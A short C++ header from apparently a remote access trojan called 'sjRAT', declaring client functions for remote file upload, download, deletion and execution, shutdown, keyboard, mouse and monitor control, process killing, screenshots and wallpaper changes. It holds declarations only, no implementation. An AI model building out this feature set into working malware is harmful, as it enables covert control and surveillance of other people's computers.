#pragma once

#include "../includes.h"

std::string MSGBOX_TEXT = "Hello from sjRAT";
std::string MSGBOX_CAPTION = "sjRAT";

void send_callback(std::string cb_text);

namespace client 
{
  void msgbox(SOCKET s, std::string msg_text);
  void msgbeep(SOCKET s, DWORD duration);

  void file_upload();
  void file_download();
  void file_delete();
  void file_execute();

  void shutdown();
  void reboot();

  void mng_kyboard();
  void mng_mouse();
  void mng_monitor();

  void get_processes();
  void process_kill();

  void screenshot();

  void play();
  void volume();

  void wallpaper();
}